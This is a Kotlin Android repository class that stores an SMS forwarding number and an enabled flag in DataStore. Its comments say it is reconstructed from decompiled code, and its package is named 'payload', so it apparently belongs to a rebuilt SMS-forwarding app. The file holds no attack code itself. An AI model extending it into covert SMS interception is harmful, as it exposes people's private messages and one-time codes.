package com.payload.jansiix0ne.data.repository

import android.content.Context
import android.util.Log
import androidx.datastore.core.DataStore
import androidx.datastore.preferences.core.Preferences
import androidx.datastore.preferences.core.booleanPreferencesKey
import androidx.datastore.preferences.core.edit
import androidx.datastore.preferences.core.stringPreferencesKey
import androidx.datastore.preferences.preferencesDataStore
import com.payload.jansiix0ne.data.model.SmsForwardingConfig
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.first
import kotlinx.coroutines.flow.map

/**
 * Repository for managing SMS forwarding configuration using DataStore
 */
class SmsForwardingRepository(private val context: Context) {
    companion object {
        private const val TAG = "SmsForwardingRepository"
        private const val DATASTORE_NAME = "forwarding_prefs"  // Based on decompiled: AbstractC3186z.java
        private val Context.dataStore: DataStore<Preferences> by preferencesDataStore(DATASTORE_NAME)
        
        // Based on decompiled: C3184x.java
        private val FORWARDING_NUMBER_KEY = stringPreferencesKey("forward_number")
        private val FORWARDING_ENABLED_KEY = booleanPreferencesKey("forward_enabled")
    }

    /**
     * Get SMS forwarding configuration as Flow
     */
    val forwardingConfig: Flow<SmsForwardingConfig> = context.dataStore.data.map { preferences ->
        SmsForwardingConfig(
            number = preferences[FORWARDING_NUMBER_KEY] ?: "",
            enabled = preferences[FORWARDING_ENABLED_KEY] ?: false
        )
    }

    /**
     * Get current SMS forwarding configuration
     */
    suspend fun getForwardingConfig(): SmsForwardingConfig {
        return forwardingConfig.first()
    }

    /**
     * Update SMS forwarding configuration
     */
    suspend fun updateForwardingConfig(config: SmsForwardingConfig) {
        try {
            context.dataStore.edit { preferences ->
                preferences[FORWARDING_NUMBER_KEY] = config.number
                preferences[FORWARDING_ENABLED_KEY] = config.enabled
            }
            Log.d(TAG, "Forwarding config updated: ${config.number}, enabled: ${config.enabled}")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to update forwarding config: ${e.message}", e)
            throw e
        }
    }
}
